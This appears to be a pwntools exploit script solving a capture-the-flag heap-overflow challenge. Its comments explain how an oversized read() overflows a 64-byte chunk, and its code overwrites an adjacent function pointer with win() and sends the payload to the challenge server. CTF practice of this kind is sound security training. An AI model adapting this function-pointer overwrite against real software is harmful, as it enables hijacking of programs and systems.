#!/usr/bin/env python3
from pwn import *

#
# Exploitation strategy:
#
# This binary contains a classic heap-based buffer overflow.
#
# Two allocations are performed consecutively:
#   1. `note = malloc(64)`           --> user-controlled input buffer
#   2. `slot = malloc(sizeof(Slot))` --> contains a function pointer
#
# Due to glibc heap alignment and metadata overhead, the first allocation
# does not occupy exactly 64 bytes. Instead, the actual heap chunk size is
# 0x40 (64 B) + 0x10 (metadata) = 0x50 (80 bytes), meaning the next allocation
# is placed immediately after an 80-byte offset.
#
# The vulnerability lies in:
#   read(STDIN_FILENO, note, 0xC0)
#
# which allows writing up to 192 bytes into a 64-byte buffer, overflowing
# into the adjacent `slot` structure.
#
# Memory layout:
#   [ note chunk (0x50 bytes) ][ slot struct ]
#
# The `display` function pointer inside `slot` is located at offset 0x00
# of the slot structure.
#
# Therefore:
#   offset to slot->display = 0x50 = 80 bytes
#
# Exploit:
#   - pad 80 bytes to reach slot->display
#   - overwrite it with address of win()
#
# When `slot->display(slot)` is called, execution is redirected to win().
#
# Root cause:
#   Unsafe use of `read()` with a size larger than the allocated buffer,
#   combined with adjacent heap allocations containing function pointers.
#

context.binary = elf = ELF('./inventory_slot', checksec=False)

p = remote("offsec.m0lecon.it", 13528)

OFFSET_TO_DISPLAY = 80              # bytes from start of `note` to slot->display
WIN               = elf.sym.win     # address of win() in the binary

payload = flat(
    b'A' * OFFSET_TO_DISPLAY,
    p64(WIN),
)

p.sendafter(b'content: ', payload)
print(p.recvall(timeout=2).decode(errors='replace'))
